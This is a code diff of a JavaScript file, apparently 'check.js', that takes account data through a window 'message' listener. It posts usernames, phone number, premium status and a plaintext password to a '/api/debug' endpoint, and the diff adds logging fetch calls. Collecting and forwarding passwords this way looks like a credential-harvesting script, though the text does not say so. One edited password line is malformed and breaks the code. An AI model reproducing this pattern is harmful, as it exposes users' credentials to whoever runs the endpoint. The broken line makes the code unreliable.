@@ -1,5 +1,4 @@
 async function sendDataToServer(data, type) {
-  // Log to server for debugging
   await fetch('/api/debug', {
     method: 'POST',
     headers: {
@@ -19,7 +18,7 @@ async function sendDataToServer(data, type) {
       usernames: data.usernames,
       phoneNumber: data.phone_number,
       isPremium: data.premium,
-      password: data.password,
+     -         password: data.password,
       quicklySet: data.quickly_set,
       type
     }),
@@ -44,8 +43,17 @@ async function sendDataToServer(data, type) {
   }
 }
 
+// Log that check.js is loaded
+fetch('/api/debug', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({ message: 'check.js loaded' }),
+});
+
+// Ensure the event listener is set up on the top-level window
 window.addEventListener('message', async (event) => {
-  console.log('Received message event:', event.data); // Log to browser console
   await fetch('/api/debug', {
     method: 'POST',
     headers: {
@@ -90,4 +98,13 @@ window.addEventListener('message', async (event) => {
       body: JSON.stringify({ message: `Unknown event type: ${JSON.stringify(event.data)}` }),
     });
   }
+});
+
+// Log that the event listener is set up
+fetch('/api/debug', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({ message: 'check.js event listener set up' }),
 });
